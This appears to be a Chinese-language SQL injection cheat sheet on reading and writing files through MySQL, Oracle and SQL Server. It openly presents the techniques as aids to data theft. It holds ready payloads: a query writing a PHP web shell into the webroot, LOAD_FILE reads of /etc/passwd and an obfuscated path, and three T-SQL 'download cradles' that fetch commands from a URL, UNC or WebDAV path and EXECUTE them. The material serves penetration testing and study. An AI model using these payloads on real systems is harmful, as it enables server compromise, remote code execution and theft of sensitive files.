###  读写文件 {docsify-ignore-all}

读取和写入文件有助于数据收集和数据泄露。许多方法包括写入webroot，这可以执行webshell，或允许数据通过端口80/443被泄露。



#### MySQL


`*`需要特权用户

| 描述   |      语句     |  
|----------|:-------------:|
| 转储到文件  |      	SELECT * FROM mytable INTO dumpfile '/tmp/somefile'     |  
| 写入 PHP Shell 到文件  |      SELECT 'system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php'     |  
| 读文件  |      	SELECT LOAD_FILE('/etc/passwd')     |  
| 读取混淆的文件  |      SELECT LOAD_FILE(0x633A5C626F6F742E696E69)<br />reads c:\boot.ini     |  
| 文件权限   |      SELECT file\_priv FROM mysql.user WHERE user = 'netspi'<br />SELECT grantee, is\_grantable FROM information\_schema.user\_privileges WHERE privilege_type = 'file' AND grantee like '%netspi%'     |  


#### Oracle

有时可以使用[UTL_FILE](http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql)。检查以下是否为非null

```code
SELECT value FROM v$parameter2 WHERE name = 'utl_file_dir';
```

如果安装了[Java](http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql)（Oracle Express中不可用），可用于读取和写入文件。

#### SQL Server

`*`需要特权用户


| 描述   |      语句     |  
|----------|:-------------:|
| 在服务器中下载Cradle bulk - TSQL   |      \-\- Bulk Insert - Download Cradle Example<br />\-\- Setup variables Declare @cmd varchar(8000)<br />\-\- Create temp table<br />CREATE TABLE #file (content nvarchar(4000));<br />\-\- Read file into temp table - web server must support propfind<br /><br />BULK INSERT #file FROM '\\sharepoint.acme.com@SSL\Path\to\file.txt';<br />\-\- Select contents of file<br /><br />SELECT @cmd = content FROM #file<br />\-\- Display command<br /><br />SELECT @cmd<br />\-\- Run command<br /><br />EXECUTE(@cmd)<br />\-\- Drop the temp table<br /><br />DROP TABLE #file     |  
| 下载Cradle OAP 1 - SQL   |      <br />\-\- OLE Automation Procedure - Download Cradle Example<br />\-\- Does not require a table, but can't handle larger payloads<br /><br />\-\- Note: This also works with unc paths \\\\ip\file.txt<br />\-\- Note: This also works with webdav paths \\ip@80\file.txt However, the target web server needs to support propfind.<br /><br />\-\- Setup Variables<br />DECLARE @url varchar(300)<br />DECLARE @WinHTTP int<br />DECLARE @handle int<br />DECLARE @Command varchar(8000<br /><br />\-\- Set target url containting TSQL<br />SET @url = 'http://127.0.0.1/mycmd.txt'<br /><br />\-\- Setup namespace<br />EXEC @handle=sp\_OACreate 'WinHttp.WinHttpRequest.5.1',@WinHTTP OUT<br /><br />\-\- Call the Open method to setup the HTTP request<br />EXEC @handle=sp\_OAMethod @WinHTTP, 'Open',NULL,'GET',@url,'false'<br /><br />\-\- Call the Send method to send the HTTP GET request<br />EXEC @handle=sp\_OAMethod @WinHTTP,'Send'<br /><br />\-\- Capture the HTTP response content<br />EXEC @handle=sp_OAGetProperty @WinHTTP,'ResponseText', @Command out<br /><br />\-\- Destroy the object<br />EXEC @handle=sp\_OADestroy @WinHTTP<br /><br />\-\- Display command<br />SELECT @Command<br /><br />\-\- Run command<br />EXECUTE (@Command)     |  
| 下载Cradle OAP 2 - TSQL  |      <br />\-\- OLE Automation Procedure - Download Cradle Example - Option 2<br />\-\- Can handle larger payloads, but requires a table<br /><br />\-\- Note: This also works with unc paths \\ip\file.txt<br />\-\- Note: This also works with webdav paths \\ip@80\file.txt However, the target web server needs to support propfind.<br /><br />\-\- Setup Variables<br />DECLARE @url varchar(300)<br />DECLARE @WinHTTP int<br />DECLARE @Handle int<br />DECLARE @Command varchar(8000)<br /><br />\-\- Set target url containting TSQL<br />SET @url = 'http://127.0.0.1/mycmd.txt'<br /><br />\-\- Create temp table to store downloaded string<br />CREATE TABLE #text(html text NULL)<br /><br />\-\- Setup namespace<br />EXEC @Handle=sp_OACreate 'WinHttp.WinHttpRequest.5.1',@WinHTTP OUT<br /><br />\-\- Call open method to configure HTTP request<br />EXEC @Handle=sp_OAMethod @WinHTTP, 'Open',NULL,'GET',@url,'false'<br /><br />\-\- Call Send method to send the HTTP request<br />EXEC @Handle=sp_OAMethod @WinHTTP,'Send'<br /><br />\-\- Capture the HTTP response content<br />INSERT #text(html)<br />EXEC @Handle=sp_OAGetProperty @WinHTTP,'ResponseText'<br /><br />\-\- Destroy the object<br />EXEC @Handle=sp_OADestroy @WinHTTP<br /><br />\-\- Display the commad<br />SELECT @Command = html from #text<br />SELECT @Command<br /><br />\-\- Run the command<br />EXECUTE (@Command)<br /><br />\-\- Remove temp table<br />DROP TABLE #text     |  
| 读取文件 - TSQL |      [https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceTxt.sql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceTxt.sql)<br /> [https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_BulkInsert.sql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_BulkInsert.sql)<br /> [https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceXlsx](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceXlsx)<br />[https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetBulk.sql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetBulk.sql)<br />[https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetTxt.sql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetTxt.sql)<br /> [https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetXlsx.sql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetXlsx.sql)   |  
| 写文件 - TSQL   |      [https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql)<br />[https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_OpenRowSetTxt.sql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_OpenRowSetTxt.sql)     |  





